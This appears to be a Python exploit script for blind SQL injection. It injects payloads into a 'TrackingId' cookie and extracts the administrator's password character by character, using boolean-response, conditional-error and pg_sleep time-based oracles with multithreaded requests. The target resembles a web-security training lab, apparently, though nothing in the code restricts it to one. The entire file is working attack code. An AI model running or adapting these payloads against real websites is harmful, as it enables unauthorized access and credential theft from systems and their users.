import requests
import concurrent.futures
import threading
import time

lock = threading.Lock()
characters = 'abcdefghijklmnopqrstuvwxyz0123456789'
found_password = [''] * 20

def test_character_for_position(position, char, payload, headers, url, tracking_id, session_id, option):
    global found_password
    if found_password[position - 1]:
        return

    session = requests.Session()
    cookie = {
        "session": session_id,
        "TrackingId": f"{tracking_id}{payload}"
    }

    start_time = time.time()
    response = session.get(url, headers=headers, cookies=cookie)
    end_time = time.time()
    elapsed_time = end_time - start_time

    found = False
    if option == 1:
        if "Welcome back" in response.text:
            found = True
    elif option == 2:
        if response.status_code == 500:
            found = True
    elif option == 3:
        if elapsed_time >= 5:
            found = True

    if found:
        with lock:
            if not found_password[position - 1]:
                found_password[position - 1] = char
                print(f"Character found for position {position}: {char}")

def test_characters_for_position(position, headers, url, tracking_id, session_id, option):
    with concurrent.futures.ThreadPoolExecutor() as executor:
        futures = []
        for char in characters:
            if option == 1:
                payload = f"' AND SUBSTRING((SELECT password FROM users WHERE username='administrator'),{position},1)='{char}"
            elif option == 2:
                payload = f"'||(SELECT CASE WHEN SUBSTR(password,{position},1)='{char}' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'"
            elif option == 3:
                payload = f"'||(SELECT CASE WHEN SUBSTR(password,{position},1)='{char}' THEN pg_sleep(5) ELSE pg_sleep(0) END FROM users WHERE username='administrator')||'"
            futures.append(executor.submit(test_character_for_position, position, char, payload, headers, url, tracking_id, session_id, option))
        
        # Wait for all futures to complete
        for future in concurrent.futures.as_completed(futures):
            pass

def retrieve_password(headers, url, tracking_id, session_id, option):
    start_time = time.time()

    for position in range(1, 21):
        test_characters_for_position(position, headers, url, tracking_id, session_id, option)

    retrieved_password = ''.join(found_password)
    print(f"The retrieved password is: {retrieved_password}")

    end_time = time.time()
    elapsed_time = end_time - start_time
    minutes = int(elapsed_time // 60)
    seconds = int(elapsed_time % 60)
    print(f"Time taken to get the password is: {minutes} minutes and {seconds} seconds")
